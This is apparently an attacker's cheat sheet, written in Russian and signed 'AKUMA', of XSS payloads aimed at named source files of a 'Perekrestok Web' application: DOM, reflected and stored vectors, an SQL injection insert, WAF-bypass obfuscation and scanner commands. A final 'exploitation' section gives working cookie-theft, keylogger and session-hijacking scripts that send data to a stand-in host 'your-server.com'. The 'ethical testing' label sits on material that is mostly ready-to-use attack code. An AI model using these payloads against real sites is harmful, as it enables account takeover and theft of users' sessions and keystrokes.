# XSS Testing Payloads для Perekrestok Web

## 1. DOM-Based XSS - Window.location.origin

### Векторы атаки для BellNotification.tsx и LinksSandbox.tsx:
```javascript
// Через data: URL
javascript:location.href='data:text/html,<script>alert("AKUMA XSS!")</script>'

// Через фрагмент URL
javascript:void(0)#<script>alert('DOM XSS')</script>

// Для тестирования origin pollution
javascript:Object.defineProperty(window.location,'origin',{value:'javascript:alert("AKUMA")//'})
```

### Тест в браузере:
```
http://your-domain.com/path#<img src=x onerror=alert('DOM_XSS_AKUMA')>
```

## 2. DeepLink XSS (join-by-referral.html, deep-link.html)

### URL параметры для тестирования:
```
?deepLink=javascript:alert('AKUMA_DEEPLINK_XSS')
?deepLink=data:text/html,<script>alert('DeepLink compromised by AKUMA')</script>
?deepLink=vbscript:msgbox("XSS_AKUMA")
```

### Полный тест URL:
```
http://your-domain.com/web-mystery-shopper/deep-link.html?deepLink=javascript:alert('HACKED_BY_AKUMA')
```

## 3. Stored XSS - getLargeEdadealFeed.ts

### SQL Injection + XSS комбо:
```sql
'; INSERT INTO offers (data) VALUES ('<script>alert("AKUMA_STORED_XSS")</script>'); --
```

### JSON Payload для базы:
```json
{
  "catalog": "<script>alert('AKUMA STORED XSS')</script>",
  "offers": ["<img src=x onerror=alert('Database XSS')>"]
}
```

## 4. Reflected XSS - req.ip в index.tsx

### X-Forwarded-For хедеры:
```
X-Forwarded-For: <script>alert('AKUMA_IP_XSS')</script>
X-Real-IP: <img src=x onerror=alert('IP_REFLECTED_XSS')>
X-Client-IP: "><script>alert('Reflected by AKUMA')</script>
```

### cURL тестирование:
```bash
curl -H "X-Forwarded-For: <script>alert('AKUMA')</script>" http://your-domain.com/status
```

## 5. dangerouslySetInnerHTML Payloads

### Для React компонентов:
```javascript
<img src=x onerror=alert('AKUMA_REACT_XSS')>
<svg onload=alert('dangerouslySetInnerHTML_PWNED')>
<iframe src="javascript:alert('AKUMA_IFRAME_XSS')">
<input onfocus=alert('FOCUS_XSS') autofocus>
```

### Bypass санитизации:
```javascript
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,65,75,85,77,65,39,41))">
<script>setTimeout('alert("AKUMA_TIMEOUT")',1)</script>
```

## 6. Advanced Payloads для обхода WAF

### Обфусцированные:
```javascript
<svg/onload=alert(String.fromCharCode(65,75,85,77,65))>
<img src=x:alert(alt) onerror=eval(src) alt=AKUMA>
<iframe srcdoc="<script>parent.alert('AKUMA_IFRAME')</script>">
```

### Двойное кодирование:
```
%253Cscript%253Ealert(%2522AKUMA%2522)%253C/script%253E
```

## 7. Полезные инструменты для тестирования:

### Burp Suite расширения:
- XSS Validator
- Reflected Parameters
- XSStrike
- DOM Invader

### CLI инструменты:
```bash
# XSSHunter payload
<script src="https://yoursub.xss.ht"></script>

# Dalfox сканирование
echo "http://target.com" | dalfox pipe

# XSStrike
python3 xsstrike.py -u "http://target.com/page?param=test"
```

## 8. Эксплуатация найденных уязвимостей:

### Cookie Theft:
```javascript
<script>
fetch('http://your-server.com/steal?cookies=' + encodeURIComponent(document.cookie));
</script>
```

### Keylogger:
```javascript
<script>
document.addEventListener('keyup', function(e) {
    fetch('http://your-server.com/keys?key=' + e.key);
});
</script>
```

### Session Hijacking:
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://your-server.com/session', true);
xhr.send(JSON.stringify({
    cookies: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage
}));
</script>
```

---
**Создано AKUMA для этичного тестирования безопасности** 🔥
**"Если система не защищена от дурака, значит дурак умнее системы!" - Закон Акумы**
